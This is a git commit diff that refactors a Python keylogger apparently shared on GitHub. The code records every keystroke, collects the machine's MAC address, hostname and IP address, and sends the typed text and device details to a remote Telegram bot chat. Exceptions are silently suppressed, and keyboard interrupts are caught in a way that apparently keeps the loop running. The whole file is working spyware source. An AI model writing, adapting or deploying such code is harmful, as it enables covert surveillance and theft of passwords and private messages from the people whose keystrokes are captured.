fe9600ee0a61c5bcb7414796861774d44b611da1
FAIRYCOREKVLT <142355342+FAIRYCOREKVLT@users.noreply.github.com>
2023-10-09 14:57:16 +0300

    Add files via upload

--- keylogger.py
+++ keylogger.py
@@ -1,54 +1,71 @@
-import os, io, time, keyboard, uuid, socket
 import asyncio
+import keyboard
+import socket
+import time
+import uuid
+from datetime import datetime
+
 from replace import char_replacements
 from tg_output_bot import bot, TOKEN, CHAT_ID
 
-# TG MESSAGE:
-
 buffer_for_tg = ""
-
-# TARGET INFO:
 
 mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
 hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
-
-# KEYLOGGING:
+current_date = datetime.now()
 
 modified_time = time.time()
+
 
 def on_key_event(key):
     global buffer_for_tg, modified_time
     char = key.name
-    if char in char_replacements: # replacing some chars for better readability
+    if char in char_replacements:
         char = char_replacements[char]
     buffer_for_tg += char
     modified_time = time.time()
 
-# MAIN FUNCTION:
 
-async def main(): # recursive function for keylogging and outputing
-        keyboard.on_press(on_key_event)
+def capture_kb():
+    keyboard.on_press(on_key_event)
+
+
+# noinspection PyBroadException
+async def device_connect_msg():
+    if TOKEN != "" and CHAT_ID != "":
         try:
-            global buffer_for_tg, modified_time # initializing buffer here to clear it after sending a message
-            if TOKEN != "" and CHAT_ID != "":
-                try:
-                    await bot.send_message(CHAT_ID, f"device connected:\nMAC adress: {mac_address}\nHost name: {hostname}\nIP address: {ip_address}")
-                except Exception:
-                    pass
-            while True:
-                if buffer_for_tg != "":
-                    if time.time() - modified_time > 2.6: # if the target didn't type anything for 2.6 seconds - 1) start a new row in .txt file 2) send TG message with typed chars by bot then clear the buffer
-                        if TOKEN != "" and CHAT_ID != "":
-                            try:
-                                await bot.send_message(CHAT_ID, f"[{mac_address}]: {buffer_for_tg}") # MAC address before typed chars in case of multiple devices tracked
-                                buffer_for_tg = "" # cleaning the buffer
-                            except Exception:
-                                pass
-                    await asyncio.sleep(0.2) # unloading CPU
-        except KeyboardInterrupt: # bypassing KeyboardInterrupt error
-            main()
+            await bot.send_message(CHAT_ID,
+                                   f"device connected:\nMAC address: {mac_address}\nHost name: "
+                                   f"{hostname}\nIP address: {ip_address}")
+        except Exception:
+            pass
 
-# RUN:
 
-asyncio.run(main())
+# noinspection PyBroadException
+async def recursive_part():
+    global buffer_for_tg, modified_time
+    if buffer_for_tg != "":
+        if time.time() - modified_time > 5.0:
+            try:
+                await bot.send_message(CHAT_ID, f"[{mac_address}]: {buffer_for_tg}")
+                buffer_for_tg = ""
+            except Exception:
+                pass
+            await asyncio.sleep(2.5)
+
+
+async def main():
+    capture_kb()
+
+    try:
+        await device_connect_msg()
+    except KeyboardInterrupt:
+        await device_connect_msg()
+    while True:
+        try:
+            await recursive_part()
+        except KeyboardInterrupt:
+            await recursive_part()
+
+# asyncio.run(main())
